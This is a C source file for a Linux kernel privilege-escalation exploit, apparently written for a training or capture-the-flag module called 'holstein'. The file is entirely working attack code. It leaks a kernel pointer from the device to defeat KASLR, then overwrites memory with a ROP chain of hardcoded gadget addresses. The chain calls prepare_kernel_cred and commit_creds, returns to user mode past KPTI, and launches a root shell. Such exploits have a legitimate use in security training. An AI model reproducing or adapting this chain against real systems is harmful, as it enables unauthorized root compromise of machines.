#include <fcntl.h>   // for open, O_RDWR
#include <stdint.h>  // for uintptr_t, uint8_t
#include <stdio.h>   // for NULL, perror, printf, puts
#include <stdlib.h>  // for EXIT_FAILURE, EXIT_SUCCESS
#include <unistd.h>  // for close, execve, read, write

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t prepare_kernel_cred	= 0xffffffff8106e240;
uintptr_t commit_creds		= 0xffffffff8106e390;

uintptr_t pop_rdi_xor_al_0_ret	= 0xffffffff812abdfd;
uintptr_t pop_rcx_xor_al_0_ret	= 0xffffffff812ac83f;
uintptr_t mov_rdi_rax_rep_movsq	= 0xffffffff8160c96b;
uintptr_t kpti			= 0xffffffff81800e26;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void leak_offset(int fd, uint8_t *data)
{
	uintptr_t ptr;

	read(fd, data, 0x410);
	ptr = *(uintptr_t *)&data[0x408];
	offset = ptr - 0xffffffff8113d33c;
	printf("[+] offset: %#lx\n", offset);
}

int main(void)
{
	uint8_t data[0x500] = { 0 };
	uintptr_t *rop_chain;
	int fd;

	save_state();

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	leak_offset(fd, data);

	rop_chain = (uintptr_t *)&data[0x408];
	*rop_chain++ = OFFSET(pop_rdi_xor_al_0_ret);
	*rop_chain++ = (uintptr_t)NULL;
	*rop_chain++ = OFFSET(prepare_kernel_cred);
	*rop_chain++ = OFFSET(pop_rcx_xor_al_0_ret);
	*rop_chain++ = 0;
	*rop_chain++ = OFFSET(mov_rdi_rax_rep_movsq);
	*rop_chain++ = OFFSET(commit_creds);
	*rop_chain++ = OFFSET(kpti);
	*rop_chain++ = (uintptr_t)NULL;
	*rop_chain++ = (uintptr_t)NULL;
	*rop_chain++ = (uintptr_t)shell;
	*rop_chain++ = cs;
	*rop_chain++ = rflags;
	*rop_chain++ = rsp;
	*rop_chain++ = ss;
	write(fd, data, (uintptr_t)rop_chain - (uintptr_t)data);

	close(fd);
	return EXIT_SUCCESS;
}
